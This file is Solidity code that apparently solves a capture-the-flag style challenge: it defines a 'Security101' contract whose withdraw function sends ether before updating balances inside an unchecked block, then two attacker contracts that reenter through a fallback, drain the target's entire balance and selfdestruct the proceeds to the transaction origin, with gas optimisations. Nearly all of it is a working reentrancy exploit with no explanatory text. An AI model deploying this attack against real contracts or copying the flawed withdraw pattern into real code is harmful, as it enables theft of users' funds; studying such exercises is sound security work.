// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    constructor(Security101 token) payable {
        token.deposit{value: msg.value>>1}();
    }

    function withdraw(address token, uint256 i) internal {
        Security101(token).withdraw(i);
    }

    function attack(address token) external payable {
        withdraw(token, address(this).balance);
        withdraw(token, address(token).balance);
        selfdestruct(payable(tx.origin)); // 2 bytes
    }

    fallback() external payable {
        if (msg.value == address(this).balance>>1) {
            withdraw(msg.sender, msg.value);
        }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address token) payable {
        new AttackerMiddle{value: msg.value}(Security101(token)).attack(token);
        selfdestruct(payable(tx.origin));
    }
}
